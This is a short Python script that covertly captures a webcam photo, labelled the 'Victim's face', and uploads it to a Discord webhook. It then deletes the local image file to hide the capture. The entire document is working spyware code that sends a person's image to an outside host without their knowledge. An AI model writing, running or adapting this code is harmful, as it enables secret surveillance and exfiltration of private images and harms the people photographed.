import cv2
import os
import requests

file = "capture.png"

def send_to_discord(picture):
    with open(picture, 'rb') as img_file:
        url = "https://discord.com/api/webhooks/xxx"
        data = {"file": (picture, img_file, "image/png")}
        requests.post(url, files=data)

capture = cv2.VideoCapture(0)

_, frame = capture.read()
cv2.imshow("Victim's face", frame)
cv2.imwrite(file, frame)
send_to_discord(file)
os.remove(file)

capture.release()
cv2.destroyAllWindows()